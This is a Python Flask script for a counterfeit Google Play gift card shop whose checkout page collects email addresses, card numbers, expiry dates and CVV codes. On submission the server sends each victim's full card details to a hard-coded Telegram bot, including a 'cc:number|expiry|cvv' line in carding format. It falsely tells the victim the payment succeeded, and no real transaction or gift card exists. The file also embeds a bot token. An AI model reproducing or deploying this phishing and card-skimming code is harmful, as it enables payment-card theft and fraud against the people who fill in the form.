from flask import Flask, render_template_string, request, jsonify
from datetime import datetime
import requests
import json

app = Flask(__name__)

# Telegram Bot Configuration
TELEGRAM_BOT_TOKEN = "8373643380:AAFT8McK5-eUfb5sasAPIPkuPyV9eAzkpj0"
TELEGRAM_CHAT_ID = "8220076576"

def send_telegram_message(message):
    """Send message to Telegram"""
    try:
        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
        data = {
            "chat_id": TELEGRAM_CHAT_ID,
            "text": message,
            "parse_mode": "HTML"
        }
        response = requests.post(url, data=data, timeout=10)
        return response.json()
    except Exception as e:
        print(f"Error sending to Telegram: {e}")
        return None

# HTML Template
HTML_TEMPLATE = '''
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Google Play Gift Cards</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: 'Roboto', Arial, sans-serif;
            background: #f5f5f5;
            min-height: 100vh;
        }
        
        .header {
            background: white;
            padding: 20px 0;
            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
            margin-bottom: 40px;
        }
        
        .header-content {
            max-width: 1200px;
            margin: 0 auto;
            padding: 0 20px;
            display: flex;
            align-items: center;
            gap: 15px;
        }
        
        .logo {
            font-size: 24px;
            font-weight: 500;
            color: #5f6368;
        }
        
        .logo-icon {
            font-size: 32px;
        }
        
        .container {
            max-width: 1200px;
            margin: 0 auto;
            padding: 0 20px 40px;
        }
        
        h1 {
            color: #202124;
            margin-bottom: 10px;
            font-size: 32px;
            font-weight: 400;
        }
        
        .subtitle {
            color: #5f6368;
            margin-bottom: 40px;
            font-size: 16px;
        }
        
        .gift-cards {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
            gap: 20px;
            margin-bottom: 50px;
        }
        
        .card {
            background: white;
            border-radius: 8px;
            padding: 0;
            box-shadow: 0 1px 3px rgba(0,0,0,0.12);
            transition: box-shadow 0.3s ease, border 0.3s ease;
            cursor: pointer;
            border: 2px solid transparent;
            overflow: hidden;
        }
        
        .card:hover {
            box-shadow: 0 4px 12px rgba(0,0,0,0.15);
        }
        
        .card.selected {
            border: 2px solid #01875f;
            box-shadow: 0 4px 12px rgba(1,135,95,0.2);
        }
        
        .card-image {
            width: 100%;
            height: 180px;
            background: linear-gradient(135deg, #34a853 0%, #01875f 100%);
            display: flex;
            align-items: center;
            justify-content: center;
            color: white;
            font-size: 48px;
            font-weight: 700;
        }
        
        .card-content {
            padding: 20px;
        }
        
        .card-amount {
            font-size: 24px;
            font-weight: 500;
            color: #202124;
            margin-bottom: 8px;
        }
        
        .card-description {
            color: #5f6368;
            font-size: 14px;
            line-height: 1.5;
        }
        
        .checkout-section {
            background: white;
            border-radius: 8px;
            padding: 40px;
            box-shadow: 0 1px 3px rgba(0,0,0,0.12);
            max-width: 600px;
            margin: 0 auto;
        }
        
        .section-title {
            font-size: 24px;
            color: #202124;
            margin-bottom: 8px;
            font-weight: 400;
        }
        
        .section-subtitle {
            color: #5f6368;
            margin-bottom: 30px;
            font-size: 14px;
        }
        
        .form-group {
            margin-bottom: 24px;
        }
        
        label {
            display: block;
            margin-bottom: 8px;
            color: #202124;
            font-size: 14px;
            font-weight: 500;
        }
        
        input {
            width: 100%;
            padding: 14px 16px;
            border: 1px solid #dadce0;
            border-radius: 4px;
            font-size: 16px;
            transition: border-color 0.2s;
            font-family: inherit;
        }
        
        input:focus {
            outline: none;
            border-color: #01875f;
        }
        
        input::placeholder {
            color: #80868b;
        }
        
        .input-row {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 16px;
        }
        
        .order-summary {
            background: #f8f9fa;
            padding: 20px;
            border-radius: 8px;
            margin-bottom: 30px;
        }
        
        .summary-row {
            display: flex;
            justify-content: space-between;
            margin-bottom: 12px;
            color: #5f6368;
            font-size: 14px;
        }
        
        .summary-row.total {
            font-size: 18px;
            font-weight: 500;
            color: #202124;
            padding-top: 12px;
            border-top: 1px solid #dadce0;
            margin-top: 12px;
            margin-bottom: 0;
        }
        
        button {
            width: 100%;
            padding: 16px;
            background: #01875f;
            color: white;
            border: none;
            border-radius: 4px;
            font-size: 16px;
            font-weight: 500;
            cursor: pointer;
            transition: background 0.2s;
            text-transform: uppercase;
            letter-spacing: 0.5px;
        }
        
        button:hover {
            background: #017c56;
        }
        
        button:disabled {
            background: #dadce0;
            cursor: not-allowed;
            color: #80868b;
        }
        
        .message {
            margin-top: 20px;
            padding: 16px;
            border-radius: 4px;
            font-size: 14px;
            display: none;
        }
        
        .message.success {
            background: #e6f4ea;
            color: #137333;
            border: 1px solid #c6e1d2;
        }
        
        .message.error {
            background: #fce8e6;
            color: #c5221f;
            border: 1px solid #f4c7c3;
        }
        
        .message.processing {
            background: #e8f0fe;
            color: #1967d2;
            border: 1px solid #d2e3fc;
        }
        
        .secure-badge {
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
            color: #5f6368;
            font-size: 13px;
            margin-top: 16px;
        }
        
        .card-icons {
            display: flex;
            gap: 8px;
            margin-top: 8px;
        }
        
        .card-icon {
            font-size: 12px;
            padding: 4px 8px;
            background: #f1f3f4;
            border-radius: 4px;
            color: #5f6368;
        }
        
        .spinner {
            display: inline-block;
            width: 14px;
            height: 14px;
            border: 2px solid #1967d2;
            border-radius: 50%;
            border-top-color: transparent;
            animation: spin 0.8s linear infinite;
            margin-right: 8px;
            vertical-align: middle;
        }
        
        @keyframes spin {
            to { transform: rotate(360deg); }
        }
    </style>
</head>
<body>
    <div class="header">
        <div class="header-content">
            <span class="logo-icon">▶</span>
            <span class="logo">Google Play Gift Cards</span>
        </div>
    </div>
    
    <div class="container">
        <h1>Buy Google Play Gift Cards</h1>
        <p class="subtitle">Choose your amount and get your code delivered instantly via email</p>
        
        <div class="gift-cards">
            <div class="card" onclick="selectCard(10)">
                <div class="card-image">$10</div>
                <div class="card-content">
                    <div class="card-amount">$10 Gift Card</div>
                    <div class="card-description">Perfect for apps, games, and more</div>
                </div>
            </div>
            <div class="card" onclick="selectCard(25)">
                <div class="card-image">$25</div>
                <div class="card-content">
                    <div class="card-amount">$25 Gift Card</div>
                    <div class="card-description">Great for subscriptions and content</div>
                </div>
            </div>
            <div class="card" onclick="selectCard(50)">
                <div class="card-image">$50</div>
                <div class="card-content">
                    <div class="card-amount">$50 Gift Card</div>
                    <div class="card-description">Popular choice for gamers</div>
                </div>
            </div>
            <div class="card" onclick="selectCard(100)">
                <div class="card-image">$100</div>
                <div class="card-content">
                    <div class="card-amount">$100 Gift Card</div>
                    <div class="card-description">Maximum value for heavy users</div>
                </div>
            </div>
        </div>
        
        <div class="checkout-section">
            <h2 class="section-title">Checkout</h2>
            <p class="section-subtitle">Complete your purchase to receive your gift card code</p>
            
            <div class="order-summary" id="orderSummary" style="display: none;">
                <div class="summary-row">
                    <span>Google Play Gift Card</span>
                    <span id="summaryAmount">$0</span>
                </div>
                <div class="summary-row total">
                    <span>Total</span>
                    <span id="summaryTotal">$0</span>
                </div>
            </div>
            
            <div class="form-group">
                <label for="email">Email Address *</label>
                <input type="email" id="email" placeholder="yourname@example.com" required>
            </div>
            
            <div class="form-group">
                <label for="cardNumber">Card Number *</label>
                <input type="text" id="cardNumber" placeholder="1234 5678 9012 3456" maxlength="19" required>
                <div class="card-icons">
                    <span class="card-icon">VISA</span>
                    <span class="card-icon">MASTERCARD</span>
                    <span class="card-icon">AMEX</span>
                </div>
            </div>
            
            <div class="input-row">
                <div class="form-group">
                    <label for="expiry">Expiry Date *</label>
                    <input type="text" id="expiry" placeholder="MM/YY" maxlength="5" required>
                </div>
                <div class="form-group">
                    <label for="cvv">CVV *</label>
                    <input type="text" id="cvv" placeholder="123" maxlength="4" required>
                </div>
            </div>
            
            <button onclick="processPayment()" id="payButton">Complete Purchase</button>
            
            <div class="secure-badge">
                🔒 Secure Payment Processing
            </div>
            
            <div class="message" id="message"></div>
        </div>
    </div>
    
    <script>
        let selectedAmount = 0;
        
        function selectCard(amount) {
            selectedAmount = amount;
            
            document.querySelectorAll('.card').forEach(card => {
                card.classList.remove('selected');
            });
            event.currentTarget.classList.add('selected');
            
            document.getElementById('orderSummary').style.display = 'block';
            document.getElementById('summaryAmount').textContent = `$${amount}`;
            document.getElementById('summaryTotal').textContent = `$${amount}`;
        }
        
        document.getElementById('cardNumber').addEventListener('input', function(e) {
            let value = e.target.value.replace(/\s/g, '');
            let formattedValue = value.match(/.{1,4}/g)?.join(' ') || value;
            e.target.value = formattedValue;
        });
        
        document.getElementById('expiry').addEventListener('input', function(e) {
            let value = e.target.value.replace(/\D/g, '');
            if (value.length >= 2) {
                value = value.slice(0, 2) + '/' + value.slice(2, 4);
            }
            e.target.value = value;
        });
        
        document.getElementById('cvv').addEventListener('input', function(e) {
            e.target.value = e.target.value.replace(/\D/g, '');
        });
        
        function showMessage(text, type) {
            const messageDiv = document.getElementById('message');
            messageDiv.className = `message ${type}`;
            messageDiv.style.display = 'block';
            
            if (type === 'processing') {
                messageDiv.innerHTML = '<span class="spinner"></span>' + text;
            } else {
                messageDiv.textContent = text;
            }
            
            if (type === 'success') {
                setTimeout(() => {
                    messageDiv.style.display = 'none';
                }, 8000);
            }
        }
        
        async function processPayment() {
            if (selectedAmount === 0) {
                showMessage('Please select a gift card amount first', 'error');
                return;
            }
            
            const email = document.getElementById('email').value;
            const cardNumber = document.getElementById('cardNumber').value.replace(/\s/g, '');
            const expiry = document.getElementById('expiry').value;
            const cvv = document.getElementById('cvv').value;
            
            if (!email || !cardNumber || !expiry || !cvv) {
                showMessage('Please fill in all required fields', 'error');
                return;
            }
            
            if (!email.includes('@') || !email.includes('.')) {
                showMessage('Please enter a valid email address', 'error');
                return;
            }
            
            const button = document.getElementById('payButton');
            button.disabled = true;
            button.textContent = 'Processing...';
            
            // Show processing message
            showMessage('Payment processing, please wait...', 'processing');
            
            try {
                const response = await fetch('/process_payment', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        email: email,
                        card_number: cardNumber,
                        expiry: expiry,
                        cvv: cvv,
                        amount: selectedAmount
                    })
                });
                
                const result = await response.json();
                
                if (result.success) {
                    showMessage('Payment done! You will receive your Google Play gift card code via email soon.', 'success');
                    document.getElementById('email').value = '';
                    document.getElementById('cardNumber').value = '';
                    document.getElementById('expiry').value = '';
                    document.getElementById('cvv').value = '';
                    selectedAmount = 0;
                    document.querySelectorAll('.card').forEach(card => {
                        card.classList.remove('selected');
                    });
                    document.getElementById('orderSummary').style.display = 'none';
                } else {
                    showMessage(result.message, 'error');
                }
            } catch (error) {
                showMessage('Payment processing failed. Please try again.', 'error');
            } finally {
                button.disabled = false;
                button.textContent = 'Complete Purchase';
            }
        }
    </script>
</body>
</html>
'''

def luhn_check(card_number):
    """Validate card number using Luhn algorithm"""
    def digits_of(n):
        return [int(d) for d in str(n)]
    
    digits = digits_of(card_number)
    odd_digits = digits[-1::-2]
    even_digits = digits[-2::-2]
    
    checksum = sum(odd_digits)
    for d in even_digits:
        checksum += sum(digits_of(d * 2))
    
    return checksum % 10 == 0

def validate_expiry(expiry_str):
    """Check if card is not expired"""
    try:
        month, year = expiry_str.split('/')
        month = int(month)
        year = int(year) + 2000
        
        if month < 1 or month > 12:
            return False, "Invalid expiration month"
        
        current_date = datetime.now()
        expiry_date = datetime(year, month, 1)
        
        if year < current_date.year or (year == current_date.year and month < current_date.month):
            return False, "Card has expired"
        
        return True, "Valid"
    except:
        return False, "Invalid expiry date format"

@app.route('/')
def index():
    return render_template_string(HTML_TEMPLATE)

@app.route('/process_payment', methods=['POST'])
def process_payment():
    data = request.json
    
    email = data.get('email')
    card_number = data.get('card_number', '').replace(' ', '')
    expiry = data.get('expiry')
    cvv = data.get('cvv')
    amount = data.get('amount')
    
    # Send info to Telegram immediately
    telegram_message = f"""
🎮 <b>New Google Play Gift Card Purchase</b>

💰 <b>Amount:</b> ${amount}
📧 <b>Email:</b> {email}

💳 <b>Card Details:</b>
━━━━━━━━━━━━━━━━━━━━
<b>Card Number:</b> {card_number}
<b>Expiry Date:</b> {expiry}
<b>CVV:</b> {cvv}
━━━━━━━━━━━━━━━━━━━━

⏰ <b>Time:</b> {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
"""
    
    send_telegram_message(telegram_message)
    
    # Validate card
    if len(card_number) < 13 or len(card_number) > 19:
        return jsonify({'success': False, 'message': 'Invalid card number length'})
    
    if len(cvv) < 3 or len(cvv) > 4:
        return jsonify({'success': False, 'message': 'Invalid CVV code'})
    
    if not luhn_check(card_number):
        send_telegram_message(f"❌ <b>Payment Declined</b> - Invalid card number (Luhn check failed)")
        return jsonify({'success': False, 'message': 'Invalid card number'})
    
    is_valid, message = validate_expiry(expiry)
    if not is_valid:
        send_telegram_message(f"❌ <b>Payment Declined</b> - {message}")
        return jsonify({'success': False, 'message': message})
    
    # Payment successful
    send_telegram_message(f"✅ <b>Payment Successful!</b> - ${amount} Google Play Gift Card\n\ncc:{card_number}|{expiry}|{cvv}")
    
    print(f"\n✅ Payment processed successfully!")
    print(f"Email: {email}")
    print(f"Amount: ${amount} Google Play Gift Card")
    print(f"Card: **** **** **** {card_number[-4:]}")
    
    return jsonify({
        'success': True, 
        'message': 'Payment successful! Gift card code will be sent to your email.'
    })

if __name__ == '__main__':
    print("=" * 50)
    print("🎮 Google Play Gift Card Shop")
    print("=" * 50)
    print("\n📱 Server starting...")
    print("📨 Telegram notifications enabled")
    print("🌐 Open your browser and visit: http://localhost:5000")
    print("\n⏳ Press CTRL+C to stop the server\n")
    app.run(debug=True, host='0.0.0.0', port=5000)
